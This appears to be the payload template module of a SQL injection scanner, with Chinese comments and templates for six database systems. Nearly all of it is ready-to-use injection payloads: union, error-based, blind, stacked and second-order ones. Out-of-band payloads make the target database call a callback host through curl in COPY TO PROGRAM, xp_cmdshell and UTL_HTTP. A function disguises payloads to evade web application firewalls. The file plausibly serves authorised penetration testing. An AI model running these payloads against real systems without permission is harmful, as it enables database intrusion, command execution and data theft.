// Payload 模板库（按 DBMS + 技术分类）
// 占位符：{ORIG}=原始值 {SLEEP}=延迟秒数 {NUM}=随机整数 {SEP}=注释符

// 全部受支持的检测技术枚举（与前端 src/shared/types.ts 的 TechniqueType 严格对应）
// 新增 'oob'（带外通道，无回显盲注兜底）；默认 techniques 不含 oob/stacked（均 opt-in）。
export const TECHNIQUE_TYPES = ['union', 'error', 'boolean', 'time', 'stacked', 'oob', 'second_order'];

export const PAYLOADS = {
  MySQL: {
    union: [
      "{ORIG} UNION SELECT {NUM},database(),version()-- -",
      "{ORIG}' UNION SELECT {NUM},database(),version()-- -",
      '{ORIG}" UNION SELECT {NUM},database(),version()-- -',
    ],
    error: [
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      '{ORIG}" AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -',
      "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
    ],
    time: [
      "{ORIG}' AND SLEEP({SLEEP})-- -",
      '{ORIG}" AND SLEEP({SLEEP})-- -',
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",  // 兼容写法，主用 SLEEP
    ],
    // 堆叠注入：以 `;` 追加独立的延迟语句，若被执行则证明可堆叠多条语句
    stacked: [
      "{ORIG}; SLEEP({SLEEP}) {SEP}",
      "{ORIG}'; SLEEP({SLEEP}) {SEP}",
      '{ORIG}"; SLEEP({SLEEP}) {SEP}',
    ],
  },
  PostgreSQL: {
    union: [
      "{ORIG} UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG}' UNION SELECT {NUM},version(),current_user-- -",
      '{ORIG}" UNION SELECT {NUM},version(),current_user-- -',
    ],
    error: [
      "{ORIG}' AND CAST((SELECT version()) AS int)-- -",
      '{ORIG}" AND CAST((SELECT version()) AS int)-- -',
      "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
    ],
    time: [
      "{ORIG}' AND pg_sleep({SLEEP})-- -",
      '{ORIG}" AND pg_sleep({SLEEP})-- -',
      "{ORIG}'; SELECT pg_sleep({SLEEP})-- -",
    ],
    // 堆叠注入：以 `;` 追加独立的 pg_sleep 延迟语句
    stacked: [
      "{ORIG}; SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}'; SELECT pg_sleep({SLEEP}) {SEP}",
      '{ORIG}"; SELECT pg_sleep({SLEEP}) {SEP}',
    ],
  },
  "SQL Server": {
    union: [
      "{ORIG} UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}' UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      '{ORIG}" UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -',
    ],
    error: [
      "{ORIG}' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
      '{ORIG}" AND 1=CONVERT(int,(SELECT DB_NAME()))-- -',
      "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS int)-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
    ],
    time: [
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}"-- -',
      "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -",
    ],
    // 堆叠注入：以 `;` 追加独立的 WAITFOR DELAY 延迟语句
    stacked: [
      "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}" {SEP}',
    ],
  },
  SQLite: {
    union: [
      "{ORIG} UNION SELECT {NUM},sqlite_version(),'-- -",
      "{ORIG}' UNION SELECT {NUM},sqlite_version(),'-- -",
      "{ORIG} UNION SELECT {NUM},sqlite_version(),'-- -",
    ],
    // SQLite 类型宽松，经典 MySQL floor(rand) 报错对其无效；改用其真实报错向量：
    // 调用不存在的函数 / 表，触发 "no such function" / "no such table"
    error: [
      "{ORIG}' AND badfunc_sqli_probe()=1-- -",
      '{ORIG}" AND badfunc_sqli_probe()=1-- -',
      "{ORIG}' AND (SELECT 1 FROM non_existent_sqli_table)-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
    ],
    time: [
      "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -",
      '{ORIG}" AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -',
      "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -",
    ],
    // 堆叠注入：以 `;` 追加独立语句（SQLite 无原生 SLEEP，用重运算近似延迟以确认堆叠可执行）
    stacked: [
      "{ORIG}; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}'; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
    ],
  },
  Oracle: {
    union: [
      "{ORIG} UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}' UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      '{ORIG}" UNION SELECT {NUM},banner,NULL FROM v$version-- -',
    ],
    error: [
      "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -',
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
    ],
    time: [
      // Oracle 无原生 SLEEP；用 DBMS_PIPE.RECEIVE_MESSAGE 挂起指定秒数（无需特权，近似延迟）
      "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      // 备选：DBMS_LOCK.SLEEP（更语义化，但需 LOCK 权限，部分环境受限）
      "{ORIG}' AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
      "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -",
    ],
    // Oracle 标准驱动不支持堆叠查询，预留空模板（检测器对该库直接返回未命中，不投放）
    stacked: [],
  },
};

// MariaDB 复用 MySQL 全部模板（协议互通，仅指纹层用版本串 'MariaDB' 关键字区分并独立上报）
PAYLOADS.MariaDB = JSON.parse(JSON.stringify(PAYLOADS.MySQL));

// OOB 带外触发语句（技术名 'oob'，无回显盲注兜底）
// 占位符：{ORIG}=原始值；{CALLBACK}=拼接后的带外回调地址（callbackBase/oob/:token）。
// 由各库触发 DBMS 主动回连（MySQL LOAD_FILE/UNC、PostgreSQL COPY PROGRAM、
// SQL Server xp_dirtree、Oracle UTL_HTTP 等），目标回连即确认注入。
// 注：SQLite 无原生带外能力，留空不投放。
export const OOB_PAYLOADS = {
  MySQL: [
    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
  ],
  MariaDB: [
    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
  ],
  PostgreSQL: [
    "{ORIG}'; COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'-- -",
    "{ORIG}' AND 1=1; COPY (SELECT 1) TO PROGRAM 'nslookup {CALLBACK}'-- -",
  ],
  'SQL Server': [
    "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}'-- -",
    "{ORIG}'; EXEC master..xp_cmdshell 'ping -n 1 {CALLBACK}'-- -",
  ],
  Oracle: [
    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('{CALLBACK}') FROM dual-- -",
    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
  ],
  SQLite: [], // SQLite 无原生带外能力，不投放 OOB
};

// DBMS 指纹规则（按响应头特征识别）
export const FINGERPRINT = {
  MySQL: [{ header: 'X-Powered-By', match: /php/i }, { header: 'Set-Cookie', match: /phpsessid/i }],
  PostgreSQL: [{ header: 'X-Powered-By', match: /(postgresql|php)/i }],
  'SQL Server': [{ header: 'X-Powered-By', match: /asp\.net/i }, { header: 'Set-Cookie', match: /asp\.net|sessionid/i }],
  SQLite: [{ header: 'X-Powered-By', match: /(python|php)/i }],
  Oracle: [{ header: 'Server', match: /oracle/i }],
  // MariaDB：协议与 MySQL 互通，但响应头常带 mariadb 标识，独立识别
  MariaDB: [{ header: 'X-Powered-By', match: /(php|mariadb)/i }, { header: 'Server', match: /mariadb/i }],
};

// UNION 指纹用的版本表达式 + 响应中可识别的版本特征（供 DBFingerprinter 判定 dbms）。
// 与 FINGERPRINT（响应头特征）互补：头特征命中则直接定库，否则走 UNION 版本回显判定。
export const DB_VERSION = {
  // MariaDB 置于 MySQL 之前：优先命中（与 DBFingerprinter 遍历顺序配合区分）
  MariaDB: { func: 'version()', sig: /MariaDB/i },
  // MySQL 负向约束：版本串若含 MariaDB 则判为 MariaDB（不让 MySQL 抢匹配）
  MySQL: { func: 'version()', sig: /^\d+\.\d+\.\d+(?!.*MariaDB).*$/i },
  PostgreSQL: { func: 'version()', sig: /PostgreSQL\s+\d+/i },
  'SQL Server': { func: '@@version', sig: /(Microsoft SQL Server|SQL Server|Microsoft SQL)/i },
  SQLite: { func: 'sqlite_version()', sig: /^\d+\.\d+\.\d+$/ },
  Oracle: { func: '(SELECT banner FROM v$version WHERE rownum=1)', sig: /(Oracle|Release\s+\d+\.\d+)/i },
};

export const DBMS_LIST = ['MySQL', 'PostgreSQL', 'SQL Server', 'SQLite', 'Oracle', 'MariaDB'];

// 各 DBMS 支持的技术（Oracle 不支持时间盲注，故 time=false）
// oob：带外通道支持标记（MySQL/MariaDB/PostgreSQL/SQL Server/Oracle 支持，SQLite 无原生带外故 false）
export const SUPPORTED = {
  MySQL: { union: true, error: true, boolean: true, time: true, oob: true, second_order: true },
  MariaDB: { union: true, error: true, boolean: true, time: true, oob: true, second_order: true },
  PostgreSQL: { union: true, error: true, boolean: true, time: true, oob: true, second_order: true },
  'SQL Server': { union: true, error: true, boolean: true, time: true, oob: true, second_order: true },
  SQLite: { union: true, error: true, boolean: true, time: true, oob: false, second_order: true },
  Oracle: { union: true, error: true, boolean: true, time: true, oob: true, second_order: true },
};

// 报错特征正则（跨库常见报错关键字）：提升为共享常量，
// 供 ErrorDetector 与 SecondOrderDetector 触发页判定复用（避免重复定义）。
export const ERROR_SIG =
  /(SQL syntax|mysql_fetch|ORA-\d{5}|Microsoft SQL Server|PostgreSQL.*ERROR|SQLite3|syntax error|Unclosed quotation|extractvalue|updatexml|conversion failed|unknown column|Division by zero)/i;

// 跨库通用"存储探针"（未知 dbms 时回退；已知 dbms 优先用 PAYLOADS[dbms].error）。
// 均为报错型、非破坏性语句（不 DROP / 不写文件 / 不 LOAD_FILE），仅触发数据库报错回显以判定二阶注入。
export const SECOND_ORDER_PROBES = [
  "'",
  "' AND '1'='1",
  "') OR ('1'='1",
  "';-- -",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
];

/**
 * 填充 payload 模板中的占位符
 * @param {string} template 含占位符的模板
 * @param {{orig?: string, sleep?: number, num?: number, sep?: string}} vars 占位符值
 * @returns {string} 填充后的 payload
 */
// 生成 N 个 NULL 占位（UNION SELECT 中非回显列填空，回显列由 WRAP 包裹结果替换）
// 非正数时至少返回 1 个 NULL，避免生成空序列导致 UNION 列数错配。
export function nullSequence(columns) {
  const n = Number.isFinite(columns) && columns > 0 ? columns : 1;
  return Array.from({ length: n }, () => 'NULL').join(',');
}

export function fillPayload(template, vars = {}) {
  return template
    .replaceAll('{ORIG}', vars.orig ?? '')
    .replaceAll('{SLEEP}', String(vars.sleep ?? 1))
    .replaceAll('{NUM}', String(vars.num ?? Math.floor(Math.random() * 9000) + 1000))
    .replaceAll('{SEP}', vars.sep ?? '-- -');
}

/**
 * WAF 规避混淆（仅将 AND/OR 关键词包裹注释，不改变语义）
 * @param {string} payload
 * @returns {string}
 */
export function obfuscatePayload(payload) {
  return payload.replace(/\s{2,}/g, ' ').replace(/\bAND\b/gi, '/*!*/AND/*!*/').replace(/\bOR\b/gi, '/*!*/OR/*!*/');
}

/**
 * 生成某 DBMS + 技术 的全部 payload（已填充占位符）
 * @param {string} dbms
 * @param {string} technique
 * @param {object} vars
 * @returns {string[]}
 */
export function buildPayloads(dbms, technique, vars = {}) {
  const list = (PAYLOADS[dbms] && PAYLOADS[dbms][technique]) || [];
  return list.map((t) => fillPayload(t, vars));
}

/**
 * 取某 DBMS + 技术 的原始模板列表（未填充占位符）
 * @param {string} dbms
 * @param {string} technique
 * @returns {string[]}
 */
export function getPayloadGroup(dbms, technique) {
  return (PAYLOADS[dbms] && PAYLOADS[dbms][technique]) || [];
}
